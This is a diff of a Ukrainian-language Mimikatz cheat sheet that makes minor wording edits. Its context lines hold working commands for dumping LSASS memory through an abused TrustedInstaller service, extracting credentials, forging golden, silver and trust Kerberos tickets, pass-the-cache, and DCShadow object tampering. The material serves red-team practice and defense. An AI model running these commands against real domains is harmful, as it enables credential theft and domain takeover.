@@ -8,7 +8,7 @@
 
 Починаючи з Windows 8.1 та Windows Server 2012 R2, були впроваджені значні заходи для захисту від крадіжки облікових даних:
 
-- **LM хеші та паролі у відкритому тексті** більше не зберігаються в пам'яті для підвищення безпеки. Специфічна настройка реєстру, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, повинна бути налаштована з значенням DWORD `0`, щоб вимкнути Digest Authentication, забезпечуючи, що паролі у "відкритому тексті" не кешуються в LSASS.
+- **LM хеші та паролі у відкритому тексті** більше не зберігаються в пам'яті для підвищення безпеки. Специфічна настройка реєстру, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ повинна бути налаштована з значенням DWORD `0`, щоб вимкнути Digest Authentication, забезпечуючи, що паролі у "відкритому тексті" не кешуються в LSASS.
 
 - **Захист LSA** введено для захисту процесу Local Security Authority (LSA) від несанкціонованого читання пам'яті та ін'єкції коду. Це досягається шляхом позначення LSASS як захищеного процесу. Активація захисту LSA передбачає:
 1. Модифікацію реєстру в _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, встановивши `RunAsPPL` на `dword:00000001`.
@@ -23,7 +23,7 @@
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Це дозволяє скинути пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
+Це дозволяє вивантажити пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -51,7 +51,7 @@ sc start TrustedInstaller
 
 ### Golden Ticket Creation
 
-Золотий квиток дозволяє здійснювати імперсонацію з доступом на рівні домену. Ключова команда та параметри:
+Золотий квиток дозволяє для доступу на рівні домену шляхом імперсонації. Ключова команда та параметри:
 
 - Command: `kerberos::golden`
 - Parameters:
@@ -68,7 +68,7 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 ```
 ### Створення Срібного Квитка
 
-Срібні Квитки надають доступ до конкретних сервісів. Основна команда та параметри:
+Срібні Квитки надають доступ до конкретних сервісів. Ключова команда та параметри:
 
 - Команда: Схожа на Золотий Квиток, але націлена на конкретні сервіси.
 - Параметри:
@@ -81,7 +81,7 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 ```
 ### Створення квитків довіри
 
-Квитки довіри використовуються для доступу до ресурсів між доменами, використовуючи відносини довіри. Ключова команда та параметри:
+Квитки довіри використовуються для доступу до ресурсів між доменами, використовуючи відносини довіри. Основна команда та параметри:
 
 - Команда: Схожа на Золотий Квиток, але для відносин довіри.
 - Параметри:
@@ -102,7 +102,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **Передати кеш**:
 
 - Команда: `kerberos::ptc`
-- Впроваджує квитки Kerberos з файлів кешу.
+- Впроваджує квитки Kerberos з кеш-файлів.
 - Приклад: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Передати квиток**:
@@ -118,7 +118,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Підробка Active Directory
 
-- **DCShadow**: Тимчасово змусити машину діяти як DC для маніпуляцій з об'єктами AD.
+- **DCShadow**: Тимчасово змусити машину діяти як DC для маніпуляції об'єктами AD.
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
